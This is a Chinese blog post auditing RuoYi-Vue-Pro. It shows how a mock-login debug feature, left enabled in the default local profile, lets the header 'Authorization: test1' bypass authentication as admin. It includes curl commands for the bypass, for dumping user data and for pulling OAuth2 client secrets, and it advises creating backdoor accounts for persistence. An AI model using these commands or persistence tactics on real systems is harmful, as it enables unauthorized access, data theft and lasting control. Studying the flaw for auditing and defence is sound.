---
title: 一次从 YAML 配置切入的代码审计思路 | RuoYi-Vue-Pro
cover: >-
  https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200348454.png
categories:
  - [实战, 代码审计]
tags:
  - 代码审计
  - Java
  - SpringBoot
  - RuoYi
  - YAML
  - 认证绕过
abbrlink: i5j6k7l8
date: 2026-06-05 18:30:00
---
# 一次从 YAML 配置切入的代码审计思路 | RuoYi-Vue-Pro

## 目录

- [前言](#前言)
- [一、过滤器链入口：YudaoWebSecurityConfigurerAdapter](#一过滤器链入口yudaowebsecurityconfigureradapter)
- [二、Token 提取逻辑：TokenAuthenticationFilter](#二token-提取逻辑tokenauthenticationfilter)
- [三、Mock 登录逻辑分析](#三mock-登录逻辑分析)
- [四、问题所在：配置文件加载机制](#四问题所在配置文件加载机制)
- [五、完整利用流程](#五完整利用流程)
- [六、漏洞复现](#六漏洞复现)
- [七、后续渗透思路](#七后续渗透思路)
- [总结](#总结)

---

## 前言

最近在审若依框架（RuoYi-Vue-Pro）的代码时，发现了一个挺有意思的点。代码本身并没有漏洞，框架对开发环境和生产环境的配置也做了区分。

问题出在项目默认加载的是本地环境配置，而本地配置中开启了 Mock 登录功能。如果没有正确切换运行环境，就会触发对应的 Mock 认证逻辑。

整个过程涉及 Spring Security、Spring Boot 配置加载以及 YAML 配置覆盖机制，值得记录一下。(学习记录)

---

## 一、过滤器链入口：YudaoWebSecurityConfigurerAdapter

先从 Spring Security 的配置类入手。

```
src/main/java/cn/iocoder/yudao/framework/security/config/YudaoWebSecurityConfigurerAdapter.java
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200344629.png)

在这里能看到 `UsernamePasswordAuthenticationFilter`，这是 Spring Security 内置的登录认证过滤器，负责处理用户名密码登录。而框架自定义的 Token 认证过滤器叫做 `authenticationTokenFilter`，实际对应的类是 `TokenAuthenticationFilter`。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200346620.png)

---

## 二、Token 提取逻辑：TokenAuthenticationFilter

跳到具体的 Token 认证过滤器：

```
src/main/java/cn/iocoder/yudao/framework/security/core/filter/TokenAuthenticationFilter.java
```

首先看 Token 是怎么拿到的：

```java
String token = SecurityFrameworkUtils.obtainAuthorization(request,
        securityProperties.getTokenHeader(), securityProperties.getTokenParameter());
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200348454.png)

其中 `securityProperties` 对应的是 `SecurityProperties` 这个配置类。

实际调用的是：

```java
SecurityFrameworkUtils.obtainAuthorization(request, "Authorization", "token")
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200350992.png)

进到 `obtainAuthorization` 方法里看：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200353238.png)

有一个常量 `AUTHORIZATION_BEARER = "Bearer"`，这个方法的逻辑很简单：

- 优先从请求 Header 里拿（字段名：`Authorization`）
- Header 里没有就从 URL 参数里拿（参数名：`token`）
- 拿到之后去掉 `Bearer` 前缀

---

## 三、Mock 登录逻辑分析

拿到 token 之后，过滤器先尝试正常走 Token 验证：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200355547.png)

```java
// 1.1 基于 token 构建登录用户
LoginUser loginUser = buildLoginUserByToken(token, userType);
```

如果 `loginUser` 返回 `null`（即 token 无效或不存在），就会尝试走 Mock 登录：

```java
// 1.2 模拟 Login 功能，方便日常开发调试
if (loginUser == null) {
    loginUser = mockLoginUser(request, token, userType);
}
```

进入 `mockLoginUser` 方法，这是一个**开发调试专用的功能**：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200357940.png)

```java
if (!securityProperties.getMockEnable()) {
    return null;
}
```

第一个判断：如果 Mock 开关关闭，直接返回 `null`（不登录）。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200400215.png)

看一下 `SecurityProperties` 中 `mockEnable` 的默认值——是 `false`，而 `mockSecret`（Mock 密钥）默认是 `test`。

乍一看，默认关闭的，按理来说没什么问题。

**但是——**

---

## 四、问题所在：配置文件加载机制

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200402470.png)

`SecurityProperties` 上有一个注解：

```java
@ConfigurationProperties(prefix = "yudao.security")
```

注意，**这个注解本身只是声明了配置的绑定规则，并不会自动把这个类注册成 Bean 并加载**。

真正触发加载的地方在 `YudaoSecurityAutoConfiguration`：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200404490.png)

这个类被 `@AutoConfiguration` 标注，会被 Spring 扫描并加载进 Bean 容器，随后通过：

```java
@EnableConfigurationProperties(SecurityProperties.class)
```

才真正把 `SecurityProperties` 激活，读取配置文件里的值。

而配置文件在哪里？

```
src/main/resources/application-local.yaml
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200406668.png)

这里涉及到 Spring Boot 内置的 **Relaxed Binding（宽松绑定）** 机制：YAML 文件里写的是 `mock-enable`（短横线分隔），Java 代码里的字段是 `mockEnable`（驼峰命名），Spring 会自动把这两者视为同一个配置项。

所以配置文件里的：

```yaml
mock-enable: true
```

直接覆盖了代码里的默认值 `false`，**导致 Mock 功能在本地环境下默认是开启的。**

补充 : yaml 文件分为测试和生产环境 , 没有问题

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605213938461.png)

但是 `application.yaml` 默认是激活 `local` profile 的 , 如果不改的话.....

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605213900580.png)

这就意味着：

```java
if (!securityProperties.getMockEnable()) {
    return null;
}
```

这个判断**不会成立**，不会提前返回 `null`，程序会继续往下走。

接下来还有第二个判断：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200408640.png)

```java
if (!token.startsWith(securityProperties.getMockSecret())) {
    return null;
}
```

`getMockSecret()` 拿到的就是前面配置里设定的默认密钥 `test`，所以 **token 必须以 `test` 开头**，否则返回 `null`。

如果 token 以 `test` 开头，则进入下一步：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200410879.png)

```java
Long userId = Long.valueOf(token.substring(securityProperties.getMockSecret().length()));
```

把 `test` 前缀截掉，取后面的部分转成 `Long` 作为用户 ID。

然后直接构造一个 `LoginUser` 对象返回：

```java
return new LoginUser().setId(userId).setUserType(userType)
        .setTenantId(WebFrameworkUtils.getTenantId(request));
```

ID 就是 `test` 后面跟的那个数字，UserType 由过滤器根据请求路径自动判断。

那 admin 的 ID 是多少？去初始化 SQL 里找：

```
sql\mysql\ruoyi-vue-pro.sql:5011
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200412735.png)

**admin 的 ID 是 1。**

也就是说，**只要发请求时把 `Authorization` header 设置成 `test1`，就会被框架自动构造成一个 admin 权限的 `LoginUser`**，完全绕过正常的 Token 认证流程。

这本来是开发阶段图方便搞的调试功能，结果默认配置文件里直接把开关打开了，一旦部署到测试或生产环境，这就是一个现成的认证绕过。

---

## 五、完整利用流程

梳理一下整个利用链路：

```
发送请求
  └── TokenAuthenticationFilter 处理
       ├── buildLoginUserByToken() → 返回 null（没有合法 token）
       └── mockLoginUser() 接管
            ├── getMockEnable() == true（配置文件默认开启）✓
            ├── token.startsWith("test") == true ✓
            ├── userId = Long.valueOf("1") = 1
            └── 构造 LoginUser(id=1, admin权限) → 认证通过
```

利用条件总结：
- 目标使用 RuoYi-Vue-Pro 框架
- 使用 `application-local.yaml` 配置（本地/开发配置未修改）
- 请求带上 Header：`Authorization: test1` 和 `tenant-id: 1`

---

## 六、漏洞复现

**不带 token 直接访问，返回 401：**

```bash
curl http://localhost:28080/admin-api/system/user/get?id=1
```

```json
{"code":401,"msg":"账号未登录","data":null}
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200415037.png)

**带上 `test1` 作为 token，伪造 admin 身份访问：**

```bash
curl -H "Authorization: test1" -H "tenant-id: 1" \
  http://localhost:28080/admin-api/system/user/get?id=1
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200416652.png)

成功返回用户信息。`test1` 对应的是 admin（ID=1）权限，不仅能查 admin 自己的信息，还能改成其他 ID 查其他用户。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200418771.png)

注：数据库里没有 id=2 和 id=3 的用户，初始化 SQL 的用户 ID 序列是 1 → 100 → 103 → 104...，中间是断的，所以查不存在的 ID 会返回 `data: null`，存在的 ID 正常返回数据。

当然，不只是这一个接口，**只要请求会经过 `TokenAuthenticationFilter` 的接口，都可以用这个方式绕过认证**。

---

## 七、后续渗透思路

有了 admin 权限之后，可以进一步扩大攻击面：

**① 批量拉取全部用户信息**

```bash
curl -H "Authorization: test1" -H "tenant-id: 1" \
  "http://localhost:28080/admin-api/system/user/page?pageNo=1&pageSize=10"
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200421296.png)

可以泄露系统全部用户信息（ID、用户名、手机号、邮箱、部门），为后续社工或进一步权限提升提供攻击面。

**② 获取 OAuth2 客户端凭证**

```bash
curl -H "Authorization: test1" -H "tenant-id: 1" \
  "http://localhost:28080/admin-api/system/oauth2-client/page?pageNo=1&pageSize=10"
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260605200423729.png)

能拿到 `client_id` + `client_secret`，有了这个就可以走正常的 OAuth2 认证流程获取 `access_token`——**即使后续 mock 漏洞被修复，也可以通过正常认证渠道持续控制后台**。

**③ 创建高权限后门账号**

利用 admin 权限直接创建一个新用户并赋予高权限，修复 mock 漏洞之后仍然可以用这个账号正常登录，做到持久化控制。

---

## 总结

这个漏洞本质上是**开发便利性功能 + 配置文件管理疏忽**的组合拳。

单独看任何一个环节都没太大问题：
- Mock 功能本身有开关保护，默认代码里是 `false`
- Mock 密钥也限制了 token 的格式

但问题就出在 `application-local.yaml` 这个配置文件里，**直接把 `mock-enable: true` 写进去了，而且这个文件很可能随着项目一起被带到了测试甚至生产环境**，导致开关实际上是开着的。

几个值得记住的点：

1. **Spring Boot 的宽松绑定（Relaxed Binding）**：`mock-enable` 和 `mockEnable` 是同一个东西，这种自动转换在审配置文件时很容易遗漏。

2. **`@ConfigurationProperties` ≠ 自动生效**：还需要 `@EnableConfigurationProperties` 或者 Bean 注册才能真正加载配置，理解这个加载链路有助于找到配置覆盖点。

3. **开发/测试配置文件的风险**：`application-local.yaml` 这类"本地开发用"的配置很容易在上线时没被清理干净，审代码的时候要注意不同环境的配置文件差异。

4. **持久化思路**：光能认证绕过还不够，趁着权限还在，先把 OAuth2 凭证和后门账号都拿到，才能在修复后继续保持控制。
